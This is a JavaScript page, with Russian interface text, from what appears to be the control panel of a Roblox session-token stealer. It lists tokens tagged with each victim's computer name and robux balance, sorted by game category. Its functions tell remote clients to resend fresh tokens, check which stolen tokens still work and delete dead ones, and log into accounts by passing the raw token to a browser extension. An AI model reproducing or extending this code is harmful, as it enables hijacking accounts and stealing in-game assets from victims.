// ── Страница пометок ──────────────────────────────────────────────────────────
if (!requireLogin()) throw new Error('redirect');

document.getElementById('sidebarSlot').innerHTML = renderHeader('bookmarks');
bindLogout();

const GAME_CATEGORIES = [
  { id: 'mm2', name: 'Murder Mystery 2', icon: '🔪', color: '#ef4444' },
  { id: 'adopt_me', name: 'Adopt Me', icon: '🐾', color: '#f59e0b' },
  { id: 'steal_brainrot', name: 'Steal a Brainrot', icon: '🧠', color: '#a855f7' }
];

let allBookmarked = [];

// Close token dropdown menus when clicking outside
document.addEventListener('click', function(e) {
  if (!e.target.closest('.token-menu-wrap')) {
    closeAllMenus();
  }
});

async function loadBookmarks() {
  const container = document.getElementById('bookmarksContainer');
  container.innerHTML = '<div class="skeleton-row" style="height:100px;"><div class="skeleton-block" style="flex:1;"></div></div>';
  try {
    const r = await apiFetch('/api/bookmarks');
    allBookmarked = await r.json();
    if (!Array.isArray(allBookmarked)) allBookmarked = [];
    updateStats();
    renderBookmarks();
  } catch (e) {
    if (e.message !== 'auth') {
      container.innerHTML = '<div class="empty"><span class="empty-icon">📭</span>Ошибка загрузки</div>';
      toast('Ошибка загрузки пометок', 'err');
    }
  }
}

function updateStats() {
  document.getElementById('sTotal').textContent = allBookmarked.length;
  for (const cat of GAME_CATEGORIES) {
    const count = allBookmarked.filter(t => (t.bookmarks || []).includes(cat.id)).length;
    const elId = cat.id === 'mm2' ? 'sMM2' : cat.id === 'adopt_me' ? 'sAdopt' : 'sBrainrot';
    document.getElementById(elId).textContent = count;
  }
}

function renderBookmarks() {
  const container = document.getElementById('bookmarksContainer');
  
  if (allBookmarked.length === 0) {
    container.innerHTML = '<div class="empty"><span class="empty-icon">🏷️</span>Нет помеченных аккаунтов<br><span style="font-size:0.9rem; color:var(--text-muted);">Пометьте аккаунты на вкладке Токены</span></div>';
    return;
  }

  let html = '';

  for (const cat of GAME_CATEGORIES) {
    const tokens = allBookmarked.filter(t => (t.bookmarks || []).includes(cat.id));
    
    html += '<div class="bookmark-category">';
    html += '<div class="bookmark-category-header">';
    html += '<div class="bookmark-category-title" style="color:' + cat.color + ';">';
    html += '<span style="font-size:1.5rem;">' + cat.icon + '</span> ' + escapeHtml(cat.name);
    html += ' <span class="bookmark-category-count">' + tokens.length + '</span>';
    html += '</div>';

    // Кнопки "Запросить" и "Проверить" на каждой категории
    html += '<div style="display:flex; gap:0.5rem; flex-wrap:wrap; align-items:center;">';
    html += '<button class="btn-secondary" style="border-color:' + cat.color + '40; color:' + cat.color + '; background:' + cat.color + '0a;" onclick="requestCategory(\'' + cat.id + '\', this)" title="Запросить обновление всех токенов в категории ' + escapeHtml(cat.name) + '">';
    html += '<span style="font-size: 1.1rem;">📡</span> Запросить</button>';
    html += '<button class="check-all-btn" style="border-color:' + cat.color + '60; color:' + cat.color + '; background:' + cat.color + '15;" onclick="checkCategory(\'' + cat.id + '\', this)" title="Проверить все токены в категории ' + escapeHtml(cat.name) + '">';
    html += '<span style="font-size: 1.1rem;">⟳</span> Проверить</button>';
    html += '</div>';
    html += '</div>';

    if (tokens.length === 0) {
      html += '<div class="bookmark-empty">Нет помеченных аккаунтов в этой категории</div>';
    } else {
      html += '<div class="tokens-grid">';
      for (const t of tokens) {
        html += renderBookmarkCard(t);
      }
      html += '</div>';
    }
    html += '</div>';
  }

  container.innerHTML = html;
}

function renderBookmarkCard(t) {
  const valid = t.valid;
  const badgeClass = valid ? 'badge-valid' : 'badge-invalid';
  const statusText = valid ? '✅' : '❌';
  const tokenFull = escapeHtml(t.security || '');
  const fileId = escapeHtml(t.file || '');

  let html = '<div class="token-card">';
  html += '<div class="token-card-status"><span class="badge ' + badgeClass + '" style="padding: 2px 8px; font-size: 0.75rem;">' + statusText + '</span></div>';
  
  if (valid && t.robux !== undefined && t.robux > 0) {
    html += '<div class="token-card-robux">' + t.robux.toLocaleString() + ' R$</div>';
  } else {
    html += '<div class="token-card-robux" style="background: rgba(255,255,255,0.05); color: var(--text-muted); border-color: transparent; box-shadow: none;">0 R$</div>';
  }
  
  let avatarHtml = '<div class="token-card-avatar">👤</div>';
  if (t.userId) {
    avatarHtml = '<div class="token-card-avatar" style="padding:0; overflow:hidden;"><img src="' + API_BASE + '/avatar-proxy/' + t.userId + '" style="width:100%; height:100%; object-fit:cover;" onerror="this.outerHTML=\'👤\'"></div>';
  }
  html += avatarHtml;
  html += '<div class="token-card-name">' + escapeHtml(t.username || '—') + '</div>';
  html += '<div class="token-card-computer">💻 ' + escapeHtml(t.computer || '—') + '</div>';
  
  // Bookmark badges
  const bookmarks = t.bookmarks || [];
  if (bookmarks.length > 0) {
    html += '<div class="bookmark-badges">';
    for (const bm of bookmarks) {
      const bmCat = GAME_CATEGORIES.find(c => c.id === bm);
      if (bmCat) {
        html += '<span class="bookmark-badge" style="background:' + bmCat.color + '15; color:' + bmCat.color + '; border-color:' + bmCat.color + '30;">' + bmCat.icon + ' ' + bmCat.name + '</span>';
      }
    }
    html += '</div>';
  }
  
  html += '<div class="token-card-actions">';
  
  if (t.security) {
    let loginBtnText = 'Войти';
    let loginClass = 'btn-login';
    const lastLogin = t.lastLogin;
    if (lastLogin) {
      const d = new Date(parseInt(lastLogin));
      loginBtnText = 'Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
      loginClass = 'btn-login logged-in';
    }
    
    html += '<div style="display:flex; gap:8px; align-items:center;">';
    html += '<button class="' + loginClass + '" style="flex:1;" onclick="loginToRoblox(\'' + tokenFull.replace(/'/g, "\\'") + '\', this, \'' + fileId.replace(/'/g, "\\'") + '\')">' + loginBtnText + '</button>';
    html += '<div class="token-menu-wrap" style="position:relative;">';
    html += '<button class="btn-secondary token-menu-btn" onclick="toggleTokenMenu(event, \'' + fileId.replace(/'/g, "\\'") + '\')">⋮</button>';
    html += '</div>';
    html += '</div>';
  }
  
  html += '</div></div>';
  return html;
}

// ── Меню действий токена (3 точки) ───────────────────────────────────────────
function toggleTokenMenu(event, fileId) {
  event.stopPropagation();
  const wrap = event.target.closest('.token-menu-wrap');
  if (!wrap) return;
  const card = wrap.closest('.token-card');

  const existing = wrap.querySelector('.token-dropdown-menu');
  closeAllMenus();
  if (existing) return;

  if (card) card.classList.add('menu-open');

  const token = allBookmarked.find(t => t.file === fileId);
  const bookmarks = (token && token.bookmarks) ? token.bookmarks : [];

  const menu = document.createElement('div');
  menu.className = 'token-dropdown-menu';
  menu.onclick = function(e) { e.stopPropagation(); };

  let html = '';

  // 1. Запросить новый токен
  html += '<button class="token-menu-item" onclick="requestToken(\'' + fileId.replace(/'/g, "\\'") + '\'); closeAllMenus();">';
  html += '<span class="menu-icon">📡</span>';
  html += '<span class="menu-label">Запросить токен</span>';
  html += '</button>';

  // 2. Пункт "Пометить" с открывающимся подменю рядом
  html += '<div class="token-menu-parent-item" onmouseenter="positionSubmenu(this)" onclick="toggleSubmenu(this, event)">';
  html += '<div class="token-menu-item has-submenu">';
  html += '<span class="menu-icon">🏷️</span>';
  html += '<span class="menu-label">Пометить</span>';
  html += '<span class="menu-arrow">›</span>';
  html += '</div>';

  // Вложенное окно-подменю сбоку
  html += '<div class="token-submenu" onclick="event.stopPropagation();">';
  html += '<div class="token-menu-section-title">Категории игр</div>';
  for (const cat of GAME_CATEGORIES) {
    const isChecked = bookmarks.includes(cat.id);
    html += '<label class="token-menu-item checkbox-item" style="--cat-color:' + cat.color + ';">';
    html += '<input type="checkbox" ' + (isChecked ? 'checked' : '') + ' onchange="toggleBookmark(\'' + fileId.replace(/'/g, "\\'") + '\', \'' + cat.id + '\', this)">';
    html += '<span class="menu-icon">' + cat.icon + '</span>';
    html += '<span class="menu-label">' + escapeHtml(cat.name) + '</span>';
    html += '</label>';
  }
  html += '</div>'; // end token-submenu
  html += '</div>'; // end token-menu-parent-item

  html += '<div class="token-menu-divider"></div>';

  // 3. Удалить токен
  html += '<button class="token-menu-item danger" onclick="deleteToken(\'' + fileId.replace(/'/g, "\\'") + '\'); closeAllMenus();">';
  html += '<span class="menu-icon">🗑️</span>';
  html += '<span class="menu-label">Удалить токен</span>';
  html += '</button>';

  menu.innerHTML = html;
  wrap.appendChild(menu);
}

function positionSubmenu(parentEl) {
  const submenu = parentEl.querySelector('.token-submenu');
  if (!submenu) return;
  const parentRect = parentEl.getBoundingClientRect();
  const submenuWidth = 220;

  submenu.style.position = 'absolute';
  submenu.style.boxShadow = '';
  submenu.style.border = '';
  submenu.style.background = '';
  submenu.style.marginTop = '';

  if (parentRect.right + submenuWidth < window.innerWidth - 10) {
    submenu.style.left = 'calc(100% + 8px)';
    submenu.style.right = 'auto';
    const arrow = parentEl.querySelector('.menu-arrow');
    if (arrow) arrow.textContent = '›';
  } else if (parentRect.left >= submenuWidth + 10) {
    submenu.style.right = 'calc(100% + 8px)';
    submenu.style.left = 'auto';
    const arrow = parentEl.querySelector('.menu-arrow');
    if (arrow) arrow.textContent = '‹';
  } else {
    submenu.style.position = 'static';
    submenu.style.boxShadow = 'none';
    submenu.style.border = 'none';
    submenu.style.background = 'rgba(255, 255, 255, 0.04)';
    submenu.style.marginTop = '6px';
    const arrow = parentEl.querySelector('.menu-arrow');
    if (arrow) arrow.textContent = '▾';
  }
}

function toggleSubmenu(parentEl, event) {
  if (event.target.tagName === 'INPUT' || event.target.closest('.checkbox-item')) return;
  positionSubmenu(parentEl);
  parentEl.classList.toggle('open');
}

function closeAllMenus() {
  document.querySelectorAll('.token-card.menu-open').forEach(c => c.classList.remove('menu-open'));
  document.querySelectorAll('.token-dropdown-menu').forEach(d => d.remove());
}

async function toggleBookmark(fileId, game, checkboxEl) {
  try {
    const r = await apiFetch('/api/bookmark', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ filename: fileId, game: game })
    });
    const data = await r.json();
    const token = allBookmarked.find(t => t.file === fileId);
    if (token) {
      token.bookmarks = data.bookmarks || [];
      if (token.bookmarks.length === 0) {
        allBookmarked = allBookmarked.filter(t => t.file !== fileId);
      }
    }
    updateStats();
    renderBookmarks();
    const cat = GAME_CATEGORIES.find(c => c.id === game);
    if (data.bookmarks && data.bookmarks.includes(game)) {
      toast('🏷️ Помечено: ' + (cat ? cat.name : game));
    } else {
      toast('🏷️ Пометка снята: ' + (cat ? cat.name : game));
    }
  } catch (e) {
    if (checkboxEl) checkboxEl.checked = !checkboxEl.checked;
    if (e.message !== 'auth') toast('Ошибка', 'err');
  }
}

// ── Запрос токенов категории ──────────────────────────────────────────────────
async function requestCategory(categoryId, btn) {
  const tokens = allBookmarked.filter(t => (t.bookmarks || []).includes(categoryId) && t.file);
  const cat = GAME_CATEGORIES.find(c => c.id === categoryId);
  if (tokens.length === 0) {
    toast('Нет аккаунтов в категории ' + (cat ? cat.name : ''), 'err');
    return;
  }
  if (!confirm('Отправить команду на принудительное обновление токенов для всех ' + tokens.length + ' аккаунтов категории ' + (cat ? cat.name : '') + '?')) return;

  const originalHtml = btn.innerHTML;
  btn.disabled = true;
  btn.innerHTML = '<span style="font-size: 1.1rem;">⏳</span> Запрос...';

  try {
    const reqs = tokens.map(t => apiFetch('/request-token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ filename: t.file })
    }).catch(() => {}));
    await Promise.allSettled(reqs);
    toast('✅ Запросы отправлены (' + tokens.length + ' шт.)');
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка отправки', 'err');
  }

  btn.disabled = false;
  btn.innerHTML = originalHtml;
}

// ── Проверка токенов категории ────────────────────────────────────────────────
async function checkCategory(categoryId, btn) {
  const tokens = allBookmarked.filter(t => (t.bookmarks || []).includes(categoryId) && t.file);
  const cat = GAME_CATEGORIES.find(c => c.id === categoryId);
  if (tokens.length === 0) {
    toast('Нет аккаунтов в категории ' + (cat ? cat.name : ''), 'err');
    return;
  }

  const originalHtml = btn.innerHTML;
  btn.disabled = true;
  btn.innerHTML = '<span style="font-size: 1.1rem;">⏳</span> Проверка...';

  let validCount = 0;
  let deletedCount = 0;

  try {
    for (const t of tokens) {
      try {
        const r = await apiFetch('/robux-check-file', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ filename: t.file })
        });
        const info = await r.json();
        if (info.valid) {
          Object.assign(t, info);
          validCount++;
        } else {
          allBookmarked = allBookmarked.filter(item => item.file !== t.file);
          deletedCount++;
        }
      } catch (e) {}
    }

    updateStats();
    renderBookmarks();

    if (deletedCount > 0) {
      toast('✅ ' + cat.name + ': ' + validCount + ' рабочих, удалено невалидных: ' + deletedCount);
    } else {
      toast('✅ ' + cat.name + ': ' + validCount + ' рабочих');
    }
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка проверки', 'err');
  }

  btn.disabled = false;
  btn.innerHTML = originalHtml;
}

// ── Запросить один токен ──────────────────────────────────────────────────────
async function requestToken(filename) {
  if (!confirm('Отправить команду на принудительное обновление токена для этого клиента?')) return;
  try {
    const r = await apiFetch('/request-token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ filename })
    });
    if (r.ok) {
      toast('✅ Запрос на обновление токена отправлен!');
    } else {
      toast('❌ Ошибка при отправке запроса', 'err');
    }
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка соединения', 'err');
  }
}

// ── Удалить токен ─────────────────────────────────────────────────────────────
async function deleteToken(fileId) {
  if (!confirm('Вы уверены, что хотите удалить этот токен?')) return;
  try {
    const r = await apiFetch('/files/' + encodeURIComponent(fileId), { method: 'DELETE' });
    if (r.ok) {
      toast('Токен удален', 'success');
      loadBookmarks();
    } else {
      toast('Ошибка удаления', 'err');
    }
  } catch (e) {
    if (e.message !== 'auth') toast('Ошибка соединения', 'err');
  }
}

// ── Login to Roblox ───────────────────────────────────────────────────────────
function loginToRoblox(token, btn, fileId) {
  if (!token) return;
  btn.textContent = '⏳...';
  btn.disabled = true;

  function handler(e) {
    if (e.data && e.data.type === 'nexus-login-response') {
      window.removeEventListener('message', handler);
      if (e.data.ok) {
        if (fileId) {
          apiFetch('/api/login-mark', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ filename: fileId })
          }).catch(()=>{});
          const tokenData = allBookmarked.find(t => t.file === fileId);
          if (tokenData) tokenData.lastLogin = Date.now();
        }
        const d = new Date();
        btn.textContent = 'Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
        btn.className = 'btn-login logged-in';
        btn.disabled = false;
        toast('✅ Вход выполнен, открываем Roblox...');
      } else {
        restoreBtnText();
        toast('⚠️ Установи расширение NEXUS для входа', 'err');
      }
    }
  }

  function restoreBtnText() {
    const tokenData = allBookmarked.find(t => t.file === fileId);
    const lastLogin = tokenData?.lastLogin;
    if (lastLogin) {
      const d = new Date(parseInt(lastLogin));
      btn.textContent = 'Заходил ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) + ' ' + d.toLocaleDateString();
      btn.className = 'btn-login logged-in';
    } else {
      btn.textContent = 'Войти';
      btn.className = 'btn-login';
    }
    btn.disabled = false;
  }

  window.addEventListener('message', handler);
  window.postMessage({ type: 'nexus-login', token }, '*');
  setTimeout(() => {
    window.removeEventListener('message', handler);
    restoreBtnText();
    toast('⚠️ Установи расширение NEXUS для входа', 'err');
  }, 800);
}

loadBookmarks();

